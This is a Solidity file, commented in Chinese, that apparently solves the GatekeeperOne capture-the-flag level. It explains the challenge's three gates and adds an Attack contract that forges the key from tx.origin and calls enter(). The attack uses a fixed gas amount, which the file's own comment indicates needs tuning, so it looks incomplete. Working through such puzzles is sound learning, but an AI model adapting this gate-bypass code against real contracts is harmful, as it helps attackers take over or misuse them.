// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 越过守门人并且注册为一个参赛者来完成这一关.
 *
 *
 */
contract GatekeeperOne {
    address public entrant;

    // 调用者为合约
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // 根据每次gasLimit的不同，消耗的gas也会不同，因此需要通过余值不断接近
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            // 17-32位为0
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            // 前32位不为0
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            // 后16位和tx.origin后16位相同
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    function attack(address _address) public {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        _address.call{gas: 100000}(
            abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), _gateKey)
        );
    }
}
